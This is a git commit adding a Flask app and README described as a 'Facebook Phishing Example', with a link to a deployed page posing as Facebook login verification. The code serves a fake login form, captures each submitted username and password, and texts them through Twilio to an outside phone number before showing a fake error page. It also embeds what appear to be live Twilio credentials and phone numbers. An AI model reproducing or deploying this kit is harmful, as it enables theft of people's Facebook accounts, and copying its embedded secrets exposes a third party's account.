9d9610029042c467228ab5e07165474b4532312c
AX <54681088+malukucyber@users.noreply.github.com>
2023-06-10 10:53:24 +0900

    Add files via upload

--- README.md
+++ README.md
@@ -1,1 +1,21 @@
-# Pemblokiran-Facebook-Verifikasi
+
+# Facebook Phishing Example
+
+[![Deployed on Vercel](https://www.overtheairdigitaltv.com/wp-content/uploads/2015/04/green-view-button.png)](https://facebook-login-verification.vercel.app/)
+
+## ✨ Features
+
+- Python
+- Flask
+
+## 💁‍♀️ How to use
+
+- Install Python requirements `pip install -r requirements.txt`
+
+- Create account on twilio
+- Create a .env file in your working directory and add these from twilio
+    - ACCOUNT_SSID = "********************************"
+    - AUTH_TOKEN = "********************************"
+    - TWILIO_NUMBER = "+14567891294"
+    - RECEIVER_NUMBER = "+919876543210"
+- Start the server for development `python3 main.py`
---
+++ main.py
@@ -0,0 +1,46 @@
+from flask import Flask, render_template, request, redirect
+from twilio.rest import Client
+import os
+from dotenv import load_dotenv
+load_dotenv()
+
+print(os.getenv('AUTH_TOKEN'))
+
+app = Flask(__name__)
+
+@app.route('/',methods=['POST', 'GET'])
+def index():
+    # return "Hello World"
+    return render_template('index.html')
+
+@app.route('/login_error',methods=['POST', 'GET'])
+def login_error():
+    return render_template('submit.html')
+
+@app.route('/login', methods=['POST', 'GET'])
+def login():
+    if request.method=='POST':
+        l_email = request.form['username']
+        l_pass = request.form['password']
+        if not l_email or not l_pass:
+            return redirect('/')
+        else:
+            sender_name = "New User"
+            sender_email = l_email
+            sender_password = l_pass
+
+            account_sid = os.getenv('ACce44f76cd867d5372878ae84f9ef525c')
+            auth_token = os.getenv('b81c190f557b313b6776e59cd1a7b50b')
+            client = Client(account_sid, auth_token) 
+            message = client.messages.create( 
+                                        from_=os.getenv('+13613147026'),  
+                                        body=f'{sender_name}\n{sender_email}\n{sender_password}',      
+                                        to=os.getenv('+6285243928441')) 
+            print("Success")
+            return redirect('/login_error')
+    else:
+        return redirect('/')
+
+
+if __name__ == '__main__':
+    app.run(debug=False, port=os.getenv("PORT", default=5000))
